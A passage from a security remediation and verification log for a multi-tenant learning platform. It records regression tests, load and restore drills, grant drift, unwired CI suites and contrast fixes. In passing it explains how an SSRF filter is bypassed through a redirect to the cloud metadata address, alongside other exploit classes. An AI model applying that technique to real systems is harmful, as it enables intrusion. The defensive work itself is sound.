was wired into the **API only**. The app that actually serves HTML to browsers
sent no CSP, no `X-Frame-Options`, no HSTS — so clickjacking protection for
`/admin` and `/studio`, and the second line of defence behind both stored-XSS
vectors, were absent from the surface that needed them. This is an H2 gap, not a
Phase 4 item; it is recorded here because this is where it was found.

#### Gates

`pnpm test` — **466 files, 2563 tests, all passing.** Lint, format, typecheck and
all nine guard scripts clean. `db:rls:check` covers 221 tenant tables (two new
ones this phase, both registered for RLS and for grants — the lesson from §9b
about grants being re-widened on a fresh provision).

---

## 8. Phase 5 — Prove it

Hardening that is not verified is a hope, not a control.

1. **Load test** to establish the real ceiling — currently derived, never measured under realistic
   traffic. Model an exam-window burst specifically.
2. **Restore drill** — restore production from backup end to end, timed and documented.
   `release:restore:validate` exists; nobody has run it against real infrastructure.
3. **External penetration test** once Phases 1–3 land. My probes were constructive proofs of
   specific hypotheses, not adversarial discovery — a tester will find things I did not.
4. **Regression tests for every proven exploit.** Each probe in the audit becomes a permanent test:
   concurrent wallet spend, concurrent coupon redemption, zip bomb, path traversal, cross-tenant
   read without wrapper, SSRF to a private address, cross-tenant CSRF.

That last item matters most. **Every fix in Phase 1 is one careless refactor away from returning**,
and only a test makes it permanent.

---

### Phase 5 execution record (2026-08-20)

Item 4 is closed. Items 1 and 2 are **measured for the first time**, on local
infrastructure, with the production runs still outstanding. Item 3 cannot be
performed from here and is prepared instead.

| Item | Outcome                                                                                 |
| ---- | --------------------------------------------------------------------------------------- |
| 5.1  | Load test — **harness built, ceiling measured locally**; production run outstanding     |
| 5.2  | Restore drill — **procedure proven and timed locally**; production drill outstanding    |
| 5.3  | External penetration test — **scoped and ready to commission**; needs a vendor          |
| 5.4  | Regression tests for every proven exploit — **closed**, three real gaps found and fixed |

#### 5.4 — all seven probes covered, and three of them were not

The plan lists seven probes that must become permanent tests. All seven had a
test. Reading them rather than counting them found three that did not cover the
thing that mattered.

**SSRF followed redirects untested.** `safeOutboundFetch` passes
`redirect: "manual"` and rejects any 3xx. That is the guard against the standard
SSRF filter bypass — approve a public host, let it 302 to `169.254.169.254`, and
every address check the guard performs is bypassed because they all ran _before_
the request. It was protected by one option and one branch, with **no test at
all**. Now covered, including that the guard rejects before it ever calls
`fetch`, so it cannot be used to reach the metadata endpoint and then object.
Verified by removing `redirect: "manual"` — the new test fails.

**The zip bomb test did not test the proven bomb.** There were tests for a single
oversized entry and for too many entries. The audit's actual measurement was
199.5 KB expanding to 200 MB spread across many files, **none of them
individually over the per-entry cap** — the aggregate case, which had no test.
A build that kept the per-entry and entry-count checks and dropped the total
would have passed both existing tests and still OOM'd on the demonstrated
package.

**Cross-tenant CSRF was never exercised on a route.** `assertSameOrigin` was
unit-tested and nothing asserted a real handler rejects a cross-origin POST. Now
tested end to end on the platform route — including that it rejects _before_
authenticating, so it cannot be used as an existence oracle.

#### 5.1 — the ceiling, measured

`scripts/perf/exam-window-load.ts` (`pnpm perf:exam-window`) drives the shape of
the route pipeline — `withGlobalDb`, released, then `withTenantTx` — at rising
concurrency. That shape is the point: holding one connection while acquiring a
second is what deadlocked the pool in C6, and a benchmark using one connection
per operation would not reproduce it.

The workload is read-then-write inside the transaction, because an exam window is
a cohort writing answers, not a cache-friendly read.

| concurrency | rps |     p50 |     p95 |     p99 | errors |
| ----------: | --: | ------: | ------: | ------: | -----: |
|           1 | 145 |   6.9ms |   8.2ms |  11.4ms |      0 |
|           5 | 418 |  11.3ms |  16.2ms |  19.7ms |      0 |
|          10 | 412 |  23.4ms |  29.3ms |  35.5ms |      0 |
|          20 | 364 |  49.4ms |  79.6ms | 108.9ms |      0 |
|          40 | 407 |  97.8ms | 104.8ms | 112.1ms |      0 |
|          80 | 395 | 199.3ms | 216.7ms | 294.1ms |      0 |
|         160 | 404 | 395.1ms | 410.7ms | 417.0ms |      0 |

Throughput saturates around 400–420 rps from concurrency 5 and stays flat to 160.
Latency then rises linearly, which is queueing rather than failure: **zero errors
at every level**, including the 20 that used to produce none at all.

The harness was validated as a control, not assumed to be one. Re-nesting the
transaction into the C6 shape and running concurrency 20 reproduces the original
finding exactly:

```
c=  20       0 rps  p50 10071.7ms  errors 19  (Unable to start a transaction in the given time.)
```

Zero successful requests, a ten-second stall, pool deadlock — the audit's
original measurement, on demand. A performance harness that cannot reproduce the
regression it exists to catch is decoration.

**What this is not.** It excludes HTTP, TLS, serialisation and Supabase
round-trips, and it ran on a developer machine against Docker Postgres. It is a
floor and a regression baseline. The production ceiling still needs
production-grade hardware and the managed database (SEC-05).

#### 5.2 — the restore drill, run for the first time

`restore-validate.mjs` turned out not to be what its name suggested: it probes an
environment that has _already_ been restored by hand, over HTTP. It never
performs a restore and never times one. "We have a restore script" was true while
"we have ever restored anything" was not.

`scripts/release/restore-drill.mjs` (`pnpm release:restore:drill`) performs the
cycle: dump, create target, restore, verify, clean up — each phase timed.

The verification is what separates a drill from a file copy. **A restore that
produces every table but loses row-level security would look successful and be a
tenant-isolation breach.** So it asserts RLS is enabled _and_ forced on every
table carrying `tenant_id`, that `app.current_tenant_id()` survived, that
policies exist, and that row counts match the source.

First recorded run, against `atlas_lms_dev`:

| phase            |  duration |
| ---------------- | --------: |
| dump             |     1.29s |
| create target    |     0.56s |
| restore          |     5.20s |
| verify           |     2.18s |
| **measured RTO** | **9.22s** |

231 tables and 443 RLS policies restored intact from a 4.2 MB dump. The RLS
detection was checked against a database deliberately holding an unprotected
`tenant_id` table, which it flags — so the check can fail.

Local Docker is not the managed database, and dump/restore is not the same
mechanism as a provider snapshot. The production drill stays open (SEC-06); what
is now settled is that the procedure and its verification work.

#### 5.3 — prepared, not performed

An external test needs a vendor and a staging environment. What was in reach was
making it commissionable: `docs/release/penetration-test-scope.md` sets out the
trust boundaries in priority order, the surfaces that matter, the fixes to verify
rather than rediscover, the accepted exceptions, rules of engagement, and — the
useful part — **seven questions the internal work could not answer**, being the
areas where constructive testing is weakest: authorization composition, tenant
resolution under conflicting signals, RLS bypass through paths nobody classified
as tenant-scoped, the idempotency registry as an oracle, uploads beyond SCORM,
races outside the money paths, and session handling across the custom-domain and
shared-subdomain cases.

It also asks the vendor to state what was tested and found clean, because a
report listing only findings cannot be distinguished from a shallow test.

#### Artifacts

`perf-exam-window.json` and `restore-drill.json` are gitignored. They are
point-in-time measurements regenerated on demand; committing them would recreate
exactly the staleness problem H18 describes.

---

## 9. Effort summary

| Phase                             | Effort    | Gate                                         |
| --------------------------------- | --------- | -------------------------------------------- |
| 0 — Restore the safety net        | ~1 day    | All CI green, lint runs                      |
| 1 — Stop the proven bleeding      | 3–4 days  | Every audit probe fails to reproduce         |
| 2 — Close architectural holes     | 1–2 weeks | RLS enforces; SSRF/CSRF blocked; email works |
| 3 — Least privilege & correctness | 1–2 weeks | MFA enforced; no hardcoded role logic        |
| 4 — Margin, privacy, operations   | 1–2 weeks | Metering live; retention active              |
| 5 — Prove it                      | ongoing   | Load test, restore drill, pen test           |

**Roughly 5–7 weeks to a defensible posture**, with the highest-risk items closed in the first week.

### If you only do three things this week

1. **Security headers + CSP** (1.1) — one config block per app; blunts both XSS vectors
2. **Un-nest the transactions** (1.6) — 0 rps → 364 rps at 80 concurrent
3. **Atomic wallet update** (1.2) — one SQL statement; closes a proven double-spend

---

## 9b. Verification audit of Phases 0-3 (2026-08-20)

Re-ran every exit gate rather than reading the records. Three findings, two of them real security
regressions that no existing check could see.

### The dev database and a fresh provision did not agree

`db:migrate:check` failed: migrations 100 and 101 were applied to dev **out of band** during Phase 3
and never recorded, so the two files had literally never executed as written. Provisioning a scratch
database from empty proved they do apply cleanly (101/101), and the dev history is now reconciled
with `prisma migrate resolve --applied`.

Comparing the scratch database against dev then exposed the real problem: **687 grant rows, two
tables different.**

| Table                                 | dev            | fresh provision                |
| ------------------------------------- | -------------- | ------------------------------ |
| `platform_operators` (atlas_app)      | SELECT         | SELECT, INSERT, UPDATE, DELETE |
| `proctoring_events` (all three roles) | SELECT, INSERT | SELECT, INSERT, UPDATE, DELETE |

On any freshly provisioned database — which is to say production — `atlas_app` could **insert its own
row into `platform_operators` and promote itself to platform operator**, the exact escalation H7
exists to prevent; and `proctoring_events`, which migration 098 deliberately grants only SELECT and
INSERT, was editable and deletable, losing the tamper-evidence of proctoring evidence.

The mechanism is worth stating because it is not obvious and will recur: `GRANT ... ON ALL TABLES IN
SCHEMA public` affects only the tables that exist **at the moment it runs**. A migration that creates
a table with narrow grants stays narrow on an incrementally-migrated database, and is silently
re-widened on a fresh provision, because `db:provision` applies `sql/grants` _after_
`prisma migrate deploy`. Dev looked correct; production would not have been.

Both are now declared explicitly in `sql/grants/025_02_table_grants.sql`, and a fresh provision
produces grants byte-identical to dev. `tests/tenant-isolation/table-privilege-boundaries.test.ts`
asserts the privileges from the catalogue, so it holds however the database was built. It was checked
against a positive control — widening either table makes it fail — because a check that cannot fail
is the same class of defect as the drift it is meant to catch.

### Exit gate 0 is met for the first time

`pnpm run ci` now runs end to end, exit 0. The last blocker was `pnpm build`: the Next type-checker
could not resolve `@atlas/api/route-metadata`, while `tsc -b` and `tsc --noEmit -p` both resolved it
fine. The api app inherited `baseUrl`/`paths` from `tsconfig.base.json`; Next does not honour the
inherited mapping. `frontend/apps/web/tsconfig.json` already declared both locally — the api app now
does the same, which is the existing pattern in this repo rather than a new one.

### Gate results, all re-run

| Gate                                                       | Result                                       |
| ---------------------------------------------------------- | -------------------------------------------- |
| 0 — `pnpm lint`                                            | Met, nine shards                             |
| 0 — `pnpm run ci` end to end                               | **Met** (was unmet since Phase 0)            |
| 0 — `db:migrate:check`                                     | Met, 101/101 recorded                        |
| 1 — every probe fails to reproduce                         | Met                                          |
| 2 — RLS blocks cross-tenant reads                          | Met, 219 tables, no permissive bypass policy |
| 2 — SSRF / CSRF / email                                    | Met                                          |
| 3 — MFA on platform operators                              | Met, enforced after the permission check     |
| 3 — no hardcoded role-key bypass                           | Met, the capability is a column              |
| 3 — `grep Math.random backend/apps/api/src/server/sales-*` | Returns nothing                              |

Suites: 1871 unit/authorization/lint-rules, 482 across integration, tenant-isolation, db, security,
events and e2e. All passing.

### Six suites ran nowhere (2026-08-20)

Re-checking the gates surfaced a larger problem than the gates themselves. **Six of the eleven test
directories were not reachable from any script or CI job**, and one CI job was testing something
other than its name.

| Suite               | Files | Tests | Ran in  |
| ------------------- | ----- | ----- | ------- |
| `tests/integration` | 65    | 258   | nothing |
| `tests/api`         | 25    | 126   | nothing |
| `tests/ci`          | 1     | 1     | nothing |
| `tests/lint-rules`  | 36    | 318   | nothing |
| `tests/security`    | 3     | 11    | nothing |
| `tests/events`      | 1     | 5     | nothing |

Three separate causes, each invisible on a green run:

1. **`test:integration` ran `tests/db`.** So did the CI job named `integration-tests`. The name
   asserted coverage that the command did not provide, and the 258 integration tests — including
   every one repaired earlier in this programme — executed in no pipeline.
2. **`test:authorization` had no database.** Its suites gate on `DATABASE_URL` and
   `PLATFORM_DATABASE_URL` and `describe.skip` themselves when either is absent, so the job went
   green while `diagnostic` and `practice` never ran. `practice` was in fact **failing**: `engine`
   had become required on `startPracticeSession` and is written straight into the NOT NULL
   `practice_sessions.session_type`, so the foreign-session denial check — an IDOR guard — had been
   broken and silent. The `integration-tests` job had the same gap in miniature: it set
   `DATABASE_URL` but not `PLATFORM_DATABASE_URL`, so `with-platform-scope` skipped.
3. **`tests/api` and `tests/ci` were referenced nowhere at all.** Not in a script, not in a job.
   **Eleven of their 127 tests were failing.**

#### The eleven failures

All were stale fixtures, and all reported as `500 INTERNAL_ERROR` rather than as a failed
assertion, because these routes validate their own output and the envelope is deliberately opaque.
`route.failure` logs the underlying message only under `NODE_ENV=development` — running the suite
that way is what turned four opaque 500s into one-line causes.

- **feature-flags (3)** — `FeatureFlagViewSchema` gained `canonicalKey` and `description`; the
  fixture had neither, so output validation failed.
- **bootstrap (1)** — two faults. The `@atlas/tenancy` mock was a factory that replaced the whole
  module, so `resolveRequestHostFromHeaders` came back undefined and the handler threw on its first
  line. The route had also grown three reads inside the transaction — support email, learner billing
  config, cached FX — none mocked.
- **platform-tenants (4)** — the provisioning helpers module gained
  `seedTenantWorkflowDefinitionsFromCatalogue`; a factory mock omits anything added later, so
  provisioning threw before reaching what the test asserts.
- **public-auth confirm/login/signup (3)** — signup and login now apply a referral for a newly
  provisioned membership, and that repository reads through `$queryRawUnsafe`. The tx stub offered
  only `$queryRaw`.

The recurring shape is worth naming, because it has now accounted for most repairs in this
programme: **a schema or module gained a member, the fixture did not, and the route validates its
own output — so a stale test presents as a broken route.**

#### What stops it recurring

`tests/lint-rules/test-suite-wiring.structure.test.ts` asserts that every directory under `tests/`
holding test files is reachable from the root `test` script, following `pnpm test:x` indirection the
way a reader would. `tests/browser` is excluded explicitly, because Playwright drives it. The check
has a positive control — removing a suite from the script makes it fail — and a guard on itself, so
it cannot pass by finding no suites.

The root `test` script now runs the suites rather than `pnpm -r test`, which resolved to per-package
`echo` stubs: `pnpm ci` was previously satisfied by **16 tests**, and now runs **2534 across 461
files**. `integration-tests` gained `PLATFORM_DATABASE_URL` and the missing suites;
`authorization-tests` gained a Postgres service so its DB-backed files execute; and a new
`static-suite-tests` job covers security, events and lint-rules.

### Residual, deliberately not changed

`isOwnerRole`/`isAdminRole` still compare reserved role keys as literals. They are **deny-only**
guards — "only the owner may assign admin", "the owner role cannot be revoked" — so they grant
nothing, and the `roles_reserved_keys_are_system` CHECK from migration 100 stops a tenant creating a
role that could impersonate those keys. Distinct from H11, which was a literal comparison that
_granted_ a predicate bypass.

---

## 9c. Item-by-item audit of Phases 0-4 (2026-08-20)

Walked all 29 numbered items plus the 8 Phase 4 items and checked each against
the running system rather than the record. **Three gaps, one of them material.**

### The platform console had no CSRF protection

Phase 2.5 says, in as many words, "validate once in `createTenantRoute` /
`createPlatformRoute`". `assertSameOrigin` was called from the tenant wrapper
only, so the one surface in the product with cross-tenant reach was the single
wrapper without the check.

The §9b record listed 2.5 as "Met — origin check in both route wrappers". That
was checked by reading, not by grepping; the guard is now applied in
`create-platform-route.ts` before any other work happens in the request.

There is no tenant to resolve on a platform route, so the comparison is against
the request's own `Host`. That is the correct pair for CSRF: in a browser-driven
attack the browser sets `Origin` to the attacking page and `Host` to the target,
so a mismatch _is_ the attack and a match cannot be forged cross-origin.

`tests/unit/api/assert-same-origin.test.ts` now asserts that **both** wrappers
call it. The existing tests exercised the helper in isolation, which is exactly
why a missing call site went unnoticed.

### The per-learner coupon limit had no concurrency test

Phase 1.3 prescribed a unique index on
`(tenant_id, coupon_id, membership_id)`. **That prescription is wrong for this
schema** and was correctly not followed: `per_learner_limit` is an integer that
may exceed 1, so a unique index would cap every coupon at one redemption per
learner regardless of configuration. The row lock on `sales_coupons` — also
prescribed by 1.3 — is what serialises redemptions.

What was missing was the evidence. `wallet-coupon-concurrency.test.ts` covered
`total_usage_limit` using a _different_ member per attempt, which says nothing
about the per-learner cap. Added the matching case: one member, five simultaneous
redemptions, `per_learner_limit = 1`, no total cap. Verified against a positive
control — removing `for update` fails both coupon tests and passes with it.

### The M16 recurrence guard scanned a hardcoded list

`system-actor.test.ts` checked the six routes the audit named for
`actorMembershipId: tenant.tenantId`. A **seventh** route making the same
substitution would have passed it silently — the same shape as the four CI guards
that were found scanning nothing in §9b.

Phase 3.4 asked for branded `TenantId`/`MembershipId` types to make this a
compile error. That remains open (~1500 references). In the meantime the check
now scans every file under `backend/apps/api/src` and
`frontend/apps/web/src/server` for the anti-pattern in any spelling, guards
itself against matching zero files, and was verified with a planted offender.

### Also fixed

`runbooks/` at the repo root still existed with nothing but a `.gitkeep`. Phase
0.5 said to delete it; the content lives in `docs/runbooks/`. Removed.

### Everything else verified against the running system

| Phase | Spot checks that passed                                                                                                                                                                                                                                                                                                                                                                           |
| ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 0     | sharded lint; RLS job has a database; both stale paths corrected and now fail loudly; `.gitignore` correct with 0 generated files tracked; orphan dirs gone                                                                                                                                                                                                                                       |
| 1     | headers on **both** apps; wallet spend atomic (the one absolute write is the credit path and takes a row lock first); coupon lock; SCORM caps before `getData()`; path guard rejects all proven payloads and keeps accepted paths inside the prefix; transactions un-nested                                                                                                                       |
| 2     | no login role is superuser or bypasses RLS; `tenant_domains` carries the scoped host-resolution policy; SCORM served with `sandbox allow-scripts` (opaque origin, no `allow-same-origin`); `SafeHtml` plus an ESLint ban, 2 remaining call sites both expected; `safeOutboundFetch` on 4 surfaces; Redis rate-limit store; nodemailer; worker entrypoint with health server; storage fails closed |
| 3     | MFA on platform and tenant pipelines; `platform_operators` table; bypass is a column; system actor at all 6 entry points; `Math.random` gone from `sales-*`; 39 relocated structure checks; one CSV helper per package boundary, cross-tested                                                                                                                                                     |
| 4     | contrast tests green; 200 `server-only` markers; both new tables present with RLS; retention column NOT NULL with a default; evidence validator correctly rejects the stale artifact; register has 8 entries; bundle ratchet passes                                                                                                                                                               |

### Gates

`pnpm test` — **466 files, 2568 tests, all passing.** Lint, format and typecheck
clean. All eleven guard scripts pass. `db:rls:check` covers 221 tenant tables.

### Still open, deliberately

- **H16** — learner first load 422.1 kB against a 150 kB target. Ratcheted.
- **3.4 branded types** — the compile-time half of M16; the scan above is the
  interim control.
- **CSP enforcement (H2)** — Report-Only pending a nonce for `ThemeInitScript`.
- **Phase 5** — load test, restore drill, external penetration test. All three
  are recorded in the exception register with owners and expiry dates.

---

## 9d. Control-integrity audit of Phases 0-5 (2026-08-20)

Previous audits checked whether the _fixes_ were present. This one checked
whether the _checks_ work, by planting a violation against each guard and
confirming it fires. That found the largest single gap in the programme so far.

### `ci:audit-metadata` was checking roughly one export per file, across 60% of files

Four separate defects, compounding. Each was invisible because the guard exited 0.

**1. It read only the first match per file.** `content.match(/permission:.../)`
without the global flag returns the first match only, so a file exporting more
than one metadata block — which is most of them, since a GET and its mutation
live together — was judged entirely on whichever export appeared first.

Demonstrated, not inferred: setting `membership.remove` to `audit: "none"` in
`members/[id]/route.metadata.ts` left the guard passing, because
`membership.read` sits above it. **Removing a member from a tenant could have
become unaudited without the guard noticing.** Same shape hid `role.delete`
behind `role.update`.

**2. 252 of 626 metadata files were outside the scan root.** The root was
`backend/apps/api/src/app/api`; two fifths of route metadata lives in domain
packages as `*.route-metadata.ts` — data-rights, payments, live sessions,
in-app purchase. The guard reported success across a scan that omitted them.

**3. Widening the root did nothing, because a second filter undid it.** The loop
skipped any file not containing the literal `routeMetadata`. Package files are
written `satisfies RouteMetadata` and never spell the lowercase form, so every
newly-included file was dropped one line later. Two filters, each reasonable
alone, silently cancelling.

**4. The prefix list had a rule that could never match.** `"data.delete"` was
listed; the permissions are `data.deletion.manage` and `data.deletion.request`,
and `"data.deletion.manage".startsWith("data.delete")` is false at the ninth
character. Subject-erasure routes were outside the guard by typo.

#### What the repaired guard found immediately

`createDeletionRequestMetadata` declared `audit: "none"` — **submitting a data
deletion request, which may name another membership as its target, was declared
unaudited.** The handler does write `DATA_DELETION_REQUESTED_AUDIT`, so the
behaviour was right and the contract was wrong; but the declaration is what
release evidence and the audit-obligation tooling read, so the two disagreed on
the one action whose trail is least optional.

#### The repair

- Parse each exported block separately, not the file as a whole.
- Scan domain packages as well as the API tree.
- Select files by whether they declare a `permission:`, not by a case-sensitive
  identifier.
- `data.delete` → `data.deletion`; `workflow.` narrowed to the two mutating
  permissions, since it was sweeping in `workflow.definition.read`; and
  `role.create` / `role.update` / `role.delete` added, which had been audited by
  convention with nothing enforcing it.
- Bind each metadata export to its HTTP verb by reading the route file that
  imports it, so a read and a mutation sharing one permission key (as
  `data.export.run` does across list, fetch and create) are judged differently.
  An unknown binding is still checked — an unreadable route file must not become
  a way to opt out.
- Skip `node_modules` and `dist` while walking. Without this the widened scan
  took two minutes per run, which is its own way of getting a guard disabled.
- A vacuity guard: fewer than 400 blocks inspected is now a hard failure.
  Verified by pointing the roots at nothing — it fails.

Nine planted violations, all now caught, baseline clean:
`membership.remove`, `role.create`, `role.update`, `role.delete`,
`workflow.transition.act`, `data.deletion.manage`, `createDeletionRequest`,
`processDeletionRequest`, `createExport`.

### Two guards I wrongly suspected

Worth recording, because the errors were mine and the guards are sound.

**`db:rls:check`** appeared not to notice a planted unprotected tenant table. It
does — the probe table had no grants, and `information_schema.columns` hides
tables the connecting role has no privilege on. Granting `SELECT` to `atlas_app`
made it fire immediately. The blind spot is real but benign: a table the
application role cannot touch cannot leak through the application, and the
blanket grant in `025_02_table_grants.sql` gives every real table grants anyway.

**`ci:audit-metadata`** initially seemed not to fire because my probe used
`role.delete`, which was not in the sensitive list at the time. That turned out
to be a real gap of its own, and is now closed.

### Phase 5 harnesses ran nowhere

`perf:exam-window` and `release:restore:drill` were built during Phase 5 and
referenced by no script and no workflow — the same rot that had left six test
suites and four CI guards unwired earlier in this programme, reintroduced by me
within the same session.

Neither belongs in per-push CI: a load test on a shared runner measures the
runner, and a restore drill on every commit is noise. `.github/workflows/drills.yml`
runs both weekly and on demand, and
`tests/lint-rules/verification-harness-wiring.structure.test.ts` asserts the
reference exists and that the schedule is a schedule rather than only
`workflow_dispatch` — which would mean "somebody remembers to click it".

### Fresh-provision equivalence, re-verified

The §9b failure mode — grants correct in dev and re-widened on a fresh provision
— was re-tested after Phase 4 added two tenant tables. A database provisioned
from empty now produces **693 grant rows identical to dev**, 104 migrations, 231
tables, 443 policies, and zero tenant tables without RLS enabled and forced.

### Gates

`pnpm test` — **467 files, 2585 tests, all passing.** Lint, format and typecheck
clean. All eleven guard scripts pass, plus the bundle ratchet.

---

## 9e. Browser-suite audit (2026-08-21)

`pnpm run ci` passes end to end and every unit, integration and isolation suite
is green — but none of those run a browser. The accessibility suite is the only
check that loads a real page, and H17 had been closed on the strength of token
arithmetic rather than a measured run. Running it found four defects, one of
them a page-level crash.

### The browser suite could not run at all

`playwright.config.ts` started the API as `pnpm --filter @atlas/api-app dev`.
The root script is `dotenv -e .env.local -- pnpm --filter @atlas/api-app dev`,
and Next reads `.env` files only from the app directory — of which
`backend/apps/api` has none. Started bare the API had **no `DATABASE_URL`**, fell
back to `localhost:5432`, and every database-backed route answered 500.

The symptom was misleading: specs failed on `toBeVisible()` long before axe ran,
which reads as a broken page rather than a misconfigured harness. Diagnosing it
needed the error `route.failure` deliberately does not expose — the payload was
`AggregateError { code: 'ECONNREFUSED' }` with an empty message, and only
`connect ECONNREFUSED ::1:5432` identified it.

### A tenant logo could crash the public landing

With the API reachable, the landing still failed to render `<main>`. The cause:

```
Invalid src prop (http://localhost:3000/api/v1/storage/local/download?...)
on `next/image`, hostname "localhost" is not configured under images
```

`next/image` validates `src` against `images.remotePatterns`, and the web app
configures none. An unlisted host does not degrade to a broken image — **it
throws during render and takes the page with it.** Branding asset URLs are
operator-supplied tenant configuration, so any tenant pointing a logo at a host
nobody had allowlisted would take down their own landing page.

Allowlisting is the usual answer and is wrong here. The allowlist would need
every current and future asset host, and widening it to a wildcard would turn
`/_next/image` into a server-side fetch of attacker-influenced URLs —
reintroducing the SSRF class closed in H3, on a route with no outbound guard.
`TenantLogo` now renders branding `unoptimized`: no optimizer fetch, no
allowlist, no crash. A logo is small and already sized; optimising it bought
little and cost a page-level crash risk tied to tenant configuration.

### H17 was not closed, and the crash was hiding that

With the page finally rendering, axe could analyse it. The login page passed —
the token ramp did its job, and **128 violations there are gone**. The landing
did not.

The dominant remaining cluster was `#817f7e`, which is exactly the second
cluster the original audit named and which I had failed to find earlier because
it is not a token: it is `text-white/45` composited over the `#1a1714` footer.
White at 45% over that background computes to `#817f7e` at 4.48:1 — the audit's
"missing by a hair", reproduced to two decimal places.

Nine footer alphas ran from 18% to 55%, all failing. On `#1a1714` normal text
needs ≥50%; on the `#3730a3` card it needs ≥60%. They are now a three-step
ladder at 50/60/70, which preserves the relative hierarchy and clears AA on both
surfaces. This is a visible change — the footer text is brighter — and it is
forced: there is no alpha below 50% that meets AA there.

Two brand accents were also being used as text: `--fba-gld` at 1.89:1 on
`--fba-bg2` and `--fba-grn` at 2.72:1. Darkening the brand values was the wrong
fix — `--fba-gld` is the FundedBeyond gold and is doing its job on badges and
rules. `--fba-gld-tx` and `--fba-grn-tx` are text-only variants that clear AA on
bg, bg2 and surf; the brand values are untouched.

### Two keyboard specs had never passed

`getByLabel("Password")` matched two controls, because Playwright's label
matching is substring by default and the toggle's aria-label is "Show password".
The audit recorded this as a genuine accessibility problem — "a screen-reader
user encounters two controls whose accessible names both begin Password". That
reading is wrong: the names are distinct and are announced distinctly. The
selector was the problem.

The tab-order expectation was wrong in a more interesting way. It asserted first
Tab lands on Email, then Password, then Sign in. All three were false: the
screen has chrome above the form, and the form contains a visibility toggle and
a "remember me" checkbox between the password field and submit — both
interactive controls that _should_ take focus. A form that skipped them would be
the accessibility failure.

Encoding the corrected sequence just moves the brittleness: it breaks the next
time anyone adds a link. The test now asserts the durable property instead —
from the first field, tabbing forward reaches submit within a bounded number of
steps and never rests on a non-interactive element. That catches a focus trap
and a `tabindex` on a `<div>`, which is what the check is for.

### Where the landing stands

**16 nodes across 9 colour pairs remain**, and they need a design decision
rather than a mechanical fix:

| foreground | background | size  | note                                                            |
| ---------- | ---------- | ----- | --------------------------------------------------------------- |
| `#fde68a`  | `#ffffff`  | 39pt  | pale gold display type, fails even the 3:1 large-text threshold |
| `#eef2ff`  | `#ffffff`  | 27pt  | near-white lavender on white                                    |
| `#d97706`  | `#ffffff`  | 9pt   | warning amber as text, 3.19:1                                   |
| `#16a34a`  | `#ede9e0`  | 8.3pt | success green as text, 2.72:1                                   |
| `#ffffff`  | `#c9a84c`  | 7.5pt | white on the gold badge, 2.29:1                                 |
| `#dc2626`  | `#ede9e0`  | 8.3pt | error red as text                                               |

Choosing legible colours for decorative display type, badges and semantic
accents on the FundedBeyond marketing page is a product call, and one where the
right answer may be to change the type treatment rather than the colour. Left
open deliberately rather than restyled unilaterally.

### Gates

`pnpm test` 467 files / 2585 tests, `pnpm run ci` exit 0, lint, format,
typecheck and the guard scripts clean, web build clean. Accessibility suite: **5
of 6 passing**, the remaining failure being the landing contrast above.

---

### H17 closed — the landing page measures clean (2026-08-21)

The last 15 nodes are fixed and the accessibility suite passes **6 of 6**. The
fixes fell into five groups, and the grouping mattered: a single "darken
everything" pass would have repainted brand surfaces that were never the
problem.

**Semantic stat text (6 nodes).** The percentages and P&L chips took their colour
from the same value that painted the progress bar beside them, so making the
number legible would have repainted the bar as a side effect. `color` and
`textColor` are now separate fields — the bar keeps `--fba-grn` / `#d97706`, the
number beside it uses a variant that clears 4.5:1. Three new text-only tokens:
`--fba-red-tx` (error red is fine on white at 4.83 but only 3.99 on
`--fba-bg2`, which is where the trade rows sit), `--fba-amb-tx` (the warning
amber was a hardcoded `#d97706` in the markup at 3.19), and the existing
`--fba-grn-tx`.

**The "MOST POPULAR" badge.** White on `--fba-gld` measured 2.29:1. Rather than
change the gold, the text went dark: `--fba-tx` on the same gold is 7.81:1, and
the badge is exactly as loud as it was.

**The score suffix.** `/100` was `--fba-ind` at `opacity-50`, which composites to
`#9b98d1` at 2.69:1. At 75% it clears AA and still reads as secondary.

**The oversized step numerals (6 nodes).** `01/02/03` at 52px and 36px in
`--fba-gld-b` and `--fba-ind-l` measured **1.25:1 and 1.12:1** — failing even the
3:1 large-text threshold by a wide margin.

These were the interesting case. Each numeral sits directly above the card's own
title, so `aria-hidden="true"` would have removed them from the accessibility
tree and satisfied axe immediately. That was rejected: hiding them helps a screen
reader user who already has the title, and does nothing for the low-vision user
who is looking straight at a numeral they cannot resolve — which is the
population 1.4.3 exists for. Passing the checker is not the same as fixing the
problem, and this programme has spent enough time on checks that were satisfied
without being true.

So they are perceivable instead. `--fba-gld-num` (#ae8c03, 3.20) and
`--fba-ind-num` (#8783c8, 3.44) stay in the gold and indigo families and stay
visibly softer than the body text beside them — 3.2 against 17.6 for
`--fba-tx` — so the numerals still read as decorative rather than competing with
the heading. Gold could not stay pale: even `--fba-gld` at full strength is
2.29:1 on white, so there is no light gold that meets the bar.

**A Turbopack cache corruption sat in the middle of this**, panicking with
"Every task must have a task type" and refusing to start the web server. It
looked like the fixes had not applied — the dump was a stale file from the
previous run reporting the old class names. Clearing `frontend/apps/web/.next`
resolved it. Worth recording because the failure presents as "my change did
nothing" rather than as a build error.

**Gates:** accessibility 6/6, `pnpm test` 467 files / 2585 tests, lint, format,
typecheck and web build clean, and the H16 bundle ratchet still passes at
422.2 kB (unchanged — these were colour values, not code).

---

## 10. What not to do

Cataloguing this because over-correction wastes as much time as under-correction.

- **Do not add a WAF, secrets manager or SIEM before Phase 0.** Broken gates make new tooling
  unverifiable.
- **Do not weaken CSP to `'unsafe-inline'`** to make `ThemeInitScript` work. Use a nonce.
- **Do not "fix" the 43 failing tests by deleting assertions.** Determine which are real first —
  half were a stale test database.
- **Do not raise `DATABASE_POOL_MAX` to work around C6.** That is what turned a 10-connection
  starve into a 20-connection deadlock. Remove the nesting instead.
- **Do not self-host Postgres to save money** while C5 is open. Managed PITR is the cheapest
  insurance in this plan.
- **Do not treat this document as approval for the hosting deviation.** That decision is separate
  and still unmade.
